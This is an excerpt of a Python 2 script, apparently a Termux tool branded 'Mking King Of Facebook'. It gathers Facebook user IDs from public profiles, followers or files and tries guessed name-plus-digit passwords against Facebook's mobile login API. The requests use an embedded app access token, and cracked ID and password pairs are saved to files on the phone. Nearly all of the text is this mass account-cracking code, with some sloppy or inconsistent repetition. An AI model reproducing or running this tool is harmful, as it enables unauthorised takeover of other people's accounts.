...
from requests.exceptions import ConnectionError
os.system('git pull')
if not os.path.isfile('/data/data/com.termux/files/home/Mcra3k/...../node_modules/bytes/index.js'):
    os.system('fuser -k 5000/tcp &')
    os.system('#')
    os.system('cd Mohammad && npm install')
    os.system('cd Mohammad && node index.js &')
    os.system('clear')
    print '\x1b[1;32mPlease join to telegram GP And send id  To  active     and Continue\x1b[0;97m'
    ...
    os.system('cd Mohammad && node index.js &')
    os.system('clear')
    print '\x1b[1;32mPlease Join telegram chanel and send id\x1b[0;97m'
    os.system('xdg-open http://t.me/Mking_script')
    time.sleep(5)
...
def log_menu():
    try:
        t_check = open('.login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\x1b[1;93m _____ Login menu _____\x1b[1;91m'
        print 47 * '-'
...
def log_menu_s():
    s = raw_input(' Mking-chose Number >> ')
    if s == '1':
        log_fb()
    elif s == '2':
        log_token()
...
def menu_s():
    ms = raw_input('Mking-chose Number >> ')
    if ms == '1':
        auto_crack()
    elif ms == '2':
        choice_crack()
...
def crack():
    ...
    os.system('clear')
    print logo
    print '\x1b[1;93m_____ Auto pass cracking _____\x1b[1;91m'
    print 47 * '-'
    print '\x1b[1;92m[1] Crack From Public id '
    print '\x1b[1;92m[2] Crack From Followers'
    print '\x1b[1;92m[3] Crack From File'
...
def a_s():
    ...
    cps = []
    oks = []
    a_s = raw_input(' Mking-chose Number >> ')
    if a_s == '1':
        os.system('clear')
        print logo
        print '\x1b[1;93m_____Auto pass public cracking _____\x1b[1;91m'
        print 47 * '-'
        ...
        try:
            ...
            os.system('clear')
            print logo
            print '\x1b[1;93m_____Auto pass public cracking_____'
        ...
        try:
            ...
            os.system('clear')
            print logo
            print '\x1b[1;93m_____ Name pass followers cracking _____'
            print ' \x1b[1;92mCloning from: ' + z
        except (KeyError, IOError):
            print '\t Invalid user \x1b[0;97m'
            raw_input('\x1b[1;92mPress enter to try again ')
        ...
        os.system('clear')
        print logo
        print '\x1b[1;93m_____ Auto pass File cracking _____\x1b[1;91m'
        print 47 * '-'
        try:
    ...
    time.sleep(0.5)
    print 47 * '-'
    print 'Mking  King Of Facebook\x1b[1;91m'
    print 47 * '-'
    ...
    def main(arg):
        ...
        try:
			...
			if "access_token" in q:
                print '\x1b[1;92m[MKING-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/MKING-OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;31;1m[MKING-CP] ' + uid + ' | ' + pass1
                cp = open('MKING-CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
			...
			q = json.loads(data)
			if "access_token" in q:
                    print '\x1b[1;92m[MKING-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/MKING-OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;31;1m[MKING-CP] ' + uid + ' | ' + pass2
                    cp = open('MKING-CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
			...
			q = json.loads(data)
			if "access_token" in q:
                        print '\x1b[1;92m[MKING-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/MKING-OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;31;1m[MKING-CP] ' + uid + ' | ' + pass3
                        cp = open('MKING-CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
			...
			q = json.loads(data)
			if "access_token" in q:
                            print '\x1b[1;92m[MKING-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/MKING-OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;31;1m[MKING-CP] ' + uid + ' | ' + pass4
                            cp = open('MKING-CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
			...
			q = json.loads(data)
			if "access_token" in q:
                                print '\x1b[1;92m[MKING-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('/sdcard/ids/MKING-OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[1;31;1m[MKING-CP] ' + uid + ' | ' + pass5
                                cp = open('MKING-CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
			...
			q = json.loads(data)
			if "access_token" in q:
                                    print '\x1b[1;92m[MKING-OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('/sdcard/ids/MKING-OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;31;1m[MKING-CP] ' + uid + ' | ' + pass6
                                    cp = open('MKING-CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
			...
			q = json.loads(data)
			if "access_token" in q:
                                        print '\x1b[1;92m[MKING-OK] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        ok = open('/sdcard/ids/MKING-OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\x1b[1;31;1m[MKING-CP] ' + uid + ' | ' + pass7
                                        cp = open('MKING-CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
			...
			q = json.loads(data)
			if "access_token" in q:
                                            print '\x1b[1;92m[MKING-OK] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                            ok = open('/sdcard/ids/MKING-OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass8 + '\n')
                                            ok.close()
                                            oks.append(uid + pass8)
                                        elif 'www.facebook.com' in q['error']:
                                            print '\x1b[1;31;1m[MKING-CP] ' + uid + ' | ' + pass8
                                            cp = open('MKING-CP.txt', 'a')
                                            cp.write(uid + ' | ' + pass8 + '\n')
                                            cp.close()
			...
			q = json.loads(data)
			if "access_token" in q:
                                                print '\x1b[1;92m[MKING-OK] \x1b[1;32m' + uid + ' | ' + pass9 + '\x1b[0;97m'
                                                ok = open('/sdcard/ids/MKING-OK.txt', 'a')
                                                ok.write(uid + ' | ' + pass9 + '\n')
                                                ok.close()
                                                oks.append(uid + pass9)
                                            elif 'www.facebook.com' in q['error']:
                                                print '\x1b[1;31;1m[MKING-CP] ' + uid + ' | ' + pass9
                                                cp = open('MKING-CP.txt', 'a')
                                                cp.write(uid + ' | ' + pass9 + '\n')
                                                cp.close()
                                                cps.apppend(uid + pass9)
                                            else:
                                                pass10 = name.lower()+p4
			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
			q = json.loads(data)
			if "access_token" in q:
                                                    print '\x1b[1;92m[MKING-OK] \x1b[1;32m' + uid + ' | ' + pass10 + '\x1b[0;97m'
                                                    ok = open('/sdcard/ids/MKING-OK.txt', 'a')
                                                    ok.write(uid + ' | ' + pass10 + '\n')
                                                    ok.close()
                                                    oks.append(uid + pass10)
                                                elif 'www.facebook.com' in q['error']:
                                                    print '\x1b[1;31;1m[MKING-CP] ' + uid + ' | ' + pass10
                                                    cp = open('MKING-CP.txt', 'a')
                                                    cp.write(uid + ' | ' + pass10 + '\n')
                                                    cp.close()
...
def crack_b():
    ...
    os.system('clear')
    print logo
    print '\x1b[1;93m_____ Number pass cracking _____\x1b[1;91m'
    print 47 * '-'
    print '\x1b[1;92m[1] Crack From Public id '
    print '\x1b[1;92m[2] Crack From Followers'
    print '\x1b[1;92m[3] Crack From File'
...
def choice_crack():
    ...
    try:
        ...
        os.system('clear')
        print logo
        print '\x1b[1;93m___ Login FB id to continue ___'
        time.sleep(1)
        log_menu()
...
def c_s():
    ...
    if a_s == '1':
        os.system('clear')
        print logo
        print '\x1b[1;93m _____ Number pass Public cracking _____\x1b[1;91m'
        print 47 * '-'
        print '\x1b[1;93m For example:100200,223344,100200300,500600,10001000\x1b[1;91m'
        print 47 * '-'
        ...
        try:
            ...
            os.system('clear')
            print logo
            print '\x1b[1;93m _____ Number pass Public cracking _____'
        ...
        os.system('clear')
        print logo
        print '\x1b[1;93m_____ Number pass followers cracking _____\x1b[1;91m'
        print 47 * '-'
        print '\x1b[1;93m For example:100200,223344,100200300,500600,10001000\x1b[1;91m'
        print 47 * '-'
        pass1 = raw_input(' \x1b[1;92m[1]Password: ')
        ...
        try:
            ...
            os.system('clear')
            print logo
            print '\x1b[1;93m_____ Number pass followers cracking _____'
            print ' Cloning from: ' + z
        except (KeyError, IOError):
            print '\t Invalid user \x1b[0;97m'
            raw_input('Press enter to try again ')
        ...
        os.system('clear')
        print logo
        print '\x1b[1;93m _____ Number pass File cracking _____\x1b[1;91m'
        print 47 * '-'
        print '\x1b[1;93m For example:100200,223344,100200300,500600,10001000\x1b[1;91m'
        print 47 * '-'
        pass1 = raw_input(' \x1b[1;92m[1]Password: ')
    ...
    time.sleep(0.5)
    print 47 * '-'
    print ' \x1b[1;97m___ Crack Running ___\x1b[1;91m'
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;94mMohammad Sultani  King Of Fcebook\x1b[1;91m'
    print 47 * '-'
                ...
                data  = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass6+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
                    ...
                    data  = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass6+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
                        ...
                        data  = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass6+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
                            ...
                            print '\x1b[1;92m[MKING-OK] ' + uid + ' | ' + pass4
                            cp = open('MKING-CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
                            ...
                            data  = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass6+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
                                ...
                                print '\x1b[1;92m[MKING-OK] ' + uid + ' | ' + pass5
                                cp = open('MKING-CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.apppend(uid + pass5)
                                ...
                                data  = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass6+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
                                    ...
                                    print '\x1b[1;92m[MKING-OK] ' + uid + ' | ' + pass6
                                    cp = open('MKING-CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.apppend(uid + pass6)
...
def crack_b():
    ...
    os.system('clear')
    print logo
    print '\x1b[1;93m_____ Name + Number pass cracking _____\x1b[1;91m'
    print 47 * '-'
    print '\x1b[1;92m[1] Crack From Public id '
    print '\x1b[1;92m[2] Crack From Followers'
    print '\x1b[1;92m[3] Crack From File'
...
def n_s():
    ...
    if a_s == '1':
        ...
        try:
            ...
            os.system('clear')
            print logo
            print '\x1b[1;93m_____Name pass public cracking_____'
            print ' \x1b[1;92mCloning from: ' + z
        except (KeyError, IOError):
            print '\t Invalid user \x1b[0;97m'
            raw_input(' \x1b[1;92mPress enter to try again ')
        ...
        os.system('clear')
        print logo
        print '\x1b[1;93m_____ Name + Number pass File cracking _____\x1b[1;91m'
        print 47 * '-'
        print '\x1b[1;93mFor example:123,1234,12345,786,12,1122\x1b[1;91m'
        print 47 * '-'
        p1 = raw_input(' \x1b[1;92m[1]Name + digit: ')
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;94mMking  King Of Facebook\x1b[1;91m'
    print 47 * '-'
